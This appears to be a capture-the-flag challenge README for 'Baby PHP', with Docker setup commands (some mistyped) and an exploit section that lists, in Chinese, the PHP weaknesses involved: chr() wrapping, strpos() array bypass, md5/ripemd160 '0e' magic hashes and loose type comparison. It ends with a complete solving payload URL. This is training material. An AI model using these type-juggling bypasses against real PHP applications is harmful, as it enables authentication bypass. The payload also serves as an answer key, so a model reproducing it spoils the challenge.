## Challenge Name

Baby PHP

## Challenge Description

How secure is PHP ???

## Difficulty

Medium

## How to run

cd to the challenge root dir and run the follow command

### docker-compose (recommend)

```
docker-compose -up -d
```

### docker

```
docker build -t . baby-php
docker run -tid -p 10000:80 baby-php
```

## Exploit

### Vuln

1. chr() 遇到负数会将它模256取整数
2. strpos()可以拿数组绕过，但是这里限制了，因为要配合后面自加等于10
3. md5()加密前与加密后相等
4. 找一个加密后等于0exxx即可以构造0exxxxx=0exxx
5. hash ripemd160 网上可以找到类似上一个点一样的payload
6. float/int型和字符型的弱类型比较

payload
```
http://ip:10000/?key1=-200&key2=7.9999999999999999&rq=240610708&fp=0e1234&np=20583002034&nq=00e1839085851394356611454660337505469745&key3=a:2:{s:8:"username";d:0;s:8:"password";d:0;}
```